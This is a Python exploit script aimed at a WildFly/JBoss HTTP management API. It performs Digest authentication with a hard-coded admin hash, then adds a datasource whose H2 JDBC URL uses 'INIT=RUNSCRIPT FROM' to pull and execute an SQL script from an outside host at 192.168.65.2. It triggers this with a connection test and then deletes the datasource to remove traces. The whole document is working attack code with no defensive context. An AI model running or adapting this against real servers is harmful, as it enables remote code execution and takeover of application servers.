import socket
import hashlib
import time
import os
import json
from _md5 import _bytelist2long
from _sha1 import _bytelist2longBigEndian

def _long2bytesBigEndian(n, blocksize=0):
    """Convert a long integer to a byte string.
    If optional blocksize is given and greater than zero, pad the front
    of the byte string with binary zeros so that the length is a multiple
    of blocksize.
    """

    # After much testing, this algorithm was deemed to be the fastest.
    s = b''
    while n > 0:
        s = (n).to_bytes(4, 'big') + s
        n = n >> 32

    # Strip off leading zeros.
    for i in range(len(s)):
        if s[i] != '\000':
            break
    else:
        # Only happens when n == 0.
        s = '\000'
        i = 0

    s = s[i:]

    # Add back some pad bytes. This could be done more efficiently
    # w.r.t. the de-padding being done above, but sigh...
    if blocksize > 0 and len(s) % blocksize:
        s = (blocksize - len(s) % blocksize) * '\000' + s

    return s

def md5digest(obj):
    """Terminate the message-digest computation and return digest.
    Return the digest of the strings passed to the update()
    method so far. This is a 16-byte string which may contain
    non-ASCII characters, including null bytes.
    """

    A = obj.A
    B = obj.B
    C = obj.C
    D = obj.D
    input = [] + obj.input
    count = [] + obj.count

    index = (obj.count[0] >> 3) & 0x3f

    if index < 56:
        padLen = 56 - index
    else:
        padLen = 120 - index

    padding = [128] + [0] * 63
    obj.update(padding[:padLen])

    # Append length (before padding).
    bits = _bytelist2long(obj.input[:56]) + count

    obj._transform(bits)

    import struct
    # Store state in digest.
    #digest = struct.pack("<IIII", obj.A, obj.B, obj.C, obj.D)
    # This required _cpython_struct
    digest = (obj.A).to_bytes(4, 'little') +  (obj.B).to_bytes(4, 'little') + (obj.C).to_bytes(4, 'little') + (obj.D).to_bytes(4, 'little') 

    obj.A = A 
    obj.B = B
    obj.C = C
    obj.D = D
    obj.input = input 
    obj.count = count 

    return digest


def sha1digest(obj):
    """Terminate the message-digest computation and return digest.
    Return the digest of the strings passed to the update()
    method so far. This is a 16-byte string which may contain
    non-ASCII characters, including null bytes.
    """

    H0 = obj.H0
    H1 = obj.H1
    H2 = obj.H2
    H3 = obj.H3
    H4 = obj.H4
    input = [] + obj.input
    count = [] + obj.count

    index = (obj.count[1] >> 3) & 0x3f

    if index < 56:
        padLen = 56 - index
    else:
        padLen = 120 - index

    padding = [0o200] + [0] * 63
    obj.update(padding[:padLen])

    # Append length (before padding).
    bits = _bytelist2longBigEndian(obj.input[:56]) + count

    obj._transform(bits)

    # Store state in digest.
    digest = _long2bytesBigEndian(obj.H0, 4) + \
             _long2bytesBigEndian(obj.H1, 4) + \
             _long2bytesBigEndian(obj.H2, 4) + \
             _long2bytesBigEndian(obj.H3, 4) + \
             _long2bytesBigEndian(obj.H4, 4)

    obj.H0 = H0
    obj.H1 = H1
    obj.H2 = H2
    obj.H3 = H3
    obj.H4 = H4
    obj.input = input
    obj.count = count

    return digest

def md5hexdigest(obj):
    return ''.join(['%02x' % c for c in md5digest(obj)])

def sha1hexdigest(obj):
    return ''.join(['%02x' % c for c in sha1digest(obj)])

# Copied from https://github.com/psf/requests/blob/main/requests/auth.py#L107
class HTTPDigestAuth():
    username = ''
    password = ''
    HA1 = ''
    last_nonce = ''
    nonce_count = 0
    chal = {}
    def __init__(self, username, password, HA1):
        self.username = username
        self.password = password
        self.HA1 = HA1

    def build_digest_header(self, method, path):
        realm = self.chal["realm"]
        nonce = self.chal["nonce"]
        qop = self.chal.get("qop")
        algorithm = self.chal.get("algorithm")
        opaque = self.chal.get("opaque")
        hash_utf8 = None
        _algorithm = "MD5"
        def md5_utf8(x):
            if isinstance(x, str):
                x = x.encode("utf-8")
            return md5hexdigest(hashlib.md5(x))

        hash_utf8 = md5_utf8
        KD = lambda s, d: hash_utf8(f"{s}:{d}")  # noqa:E731
        entdig = None
        #A1 = f"{self.username}:{realm}:{self.password}"
        #HA1 = hash_utf8(A1)
        HA1 = self.HA1
        print(HA1)
        A2 = f"{method}:{path}"
        HA2 = hash_utf8(A2)
        # AttributeError: module 'struct' has no attribute 'pack'

        if nonce == self.last_nonce:
            self.nonce_count += 1
        else:
            self.nonce_count = 1
        ncvalue = f"{self.nonce_count:08x}"
        s = str(self.nonce_count).encode("utf-8")
        s += nonce.encode("utf-8")
        s += time.ctime().encode("utf-8")
        s += os.urandom(8)
        cnonce = sha1hexdigest(hashlib.sha1(s))[:16]
        if not qop:
            respdig = KD(HA1, f"{nonce}:{HA2}")
        elif qop == "auth" or "auth" in qop.split(","):
            noncebit = f"{nonce}:{ncvalue}:{cnonce}:auth:{HA2}"
            respdig = KD(HA1, noncebit)
        else:
            return None
        self.last_nonce = nonce
        base = (
            f'username="{self.username}", realm="{realm}", nonce="{nonce}", '
            f'uri="{path}", response="{respdig}"'
        )
        if opaque:
            base += f', opaque="{opaque}"'
        if algorithm:
            base += f', algorithm="{algorithm}"'
        if entdig:
            base += f', digest="{entdig}"'
        if qop:
            base += f', qop="auth", nc={ncvalue}, cnonce="{cnonce}"'
        return f"Digest {base}"


def post(data):
    # Use JSON instead of DMR 
    # https://docs.jboss.org/author/display/WFLY9/The%20HTTP%20management%20API.html
    # https://docs.jboss.org/author/display/AS71/Management%20API%20reference.html
    d = json.dumps(json.loads(data)).encode('utf-8')
    header = auth.build_digest_header("POST", "/management").encode('utf-8')
    text = (b"""POST /management HTTP/1.1
Host: 127.0.0.1:9990
Accept: application/json
X-Management-Client-Name: HAL
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Content-Type: application/json
Connection: Keep-alive
Authorization: """ + header + b"""
Content-Length: """ + str(len(d)).encode("utf-8") + b"""

""" + d).replace(b"\n", b"\r\n")
    s.send(text)
    return s.recv(1000)

auth=HTTPDigestAuth('admin', '', '2a0923285184943425d1f53ddd58ec7a')
s=socket.socket()
s.connect(("127.0.0.1", 9990))
s.send(b"""GET /management HTTP/1.1
Host: 127.0.0.1:9990
Connection: Keep-alive

""".replace(b"\n", b"\r\n"))
r=s.recv(1000).split(b"WWW-Authenticate: Digest ")
wwwAuth=r[1].split(b"\r\n")[0].split(b", ")
for vv in wwwAuth:
    kk = vv.decode('utf-8').split("=")
    k = kk[0]
    v = '='.join(kk[1:]).replace('"', '')
    auth.chal[k] = v

name = sha1hexdigest(hashlib.sha1(os.urandom(16)))[0:8].replace("0", "")

a = post(f'''{{
"name":"{name}",
"address":[{{"subsystem": "datasources"}},{{"data-source":"{name}"}}],
"operation": "add",
"jndi-name": "java:/{name}",
"driver-name":"h2",
"connection-url": "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=RUNSCRIPT FROM 'http://192.168.65.2:1234/h2.sql'",
"user-name":  "sa"  ,
"driver-classs":"org.h2.Driver",
"password": "sa",
"validate-on-match": false
}}''')

print(a)
a = post(f'''{{
"operation": "composite",
"address": [],
"steps": [
{{
"name":"H2DS",
"address":[{{"subsystem": "datasources"}},{{"data-source":"{name}"}}],
"operation": "test-connection-in-pool"
}},
{{
"name":"H2DS",
"address":[{{"subsystem": "datasources"}},{{"data-source":"{name}"}}],
"operation": "remove"
}}]}}
''')
a